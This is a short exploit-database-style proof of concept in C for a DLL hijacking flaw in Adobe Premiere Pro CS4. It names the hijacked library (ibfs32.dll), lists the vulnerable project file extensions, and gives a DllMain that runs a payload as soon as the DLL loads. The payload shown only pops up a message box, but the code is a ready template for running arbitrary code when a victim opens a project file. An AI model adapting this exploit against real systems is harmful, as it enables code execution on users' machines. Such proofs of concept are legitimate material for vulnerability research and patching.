/* 
Exploit Title: Adobe Premier Pro CS4 DLL Hijacking Exploit (ibfs32.dll)
Date: August 25, 2010
Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
Version: CS4 v4.0.0 (314 (MC: 160820))
Tested on: Windows 7 x64 Ultimate
Vulnerable extensions: .pproj .prfpset .prexport .prm .prmp .prpreset .prproj .prsl .prtl .vpr
Greetz: Astalavista, OffSEC, Exploit-DB
*/

#include <windows.h>

BOOL WINAPI DllMain (
            HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
{
    switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		dll_hijack();
	case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
	break;
	}
	return TRUE;
}

int dll_hijack()
{
  MessageBox(0, "Adobe DLL Hijacking!", "DLL Message", MB_OK);
}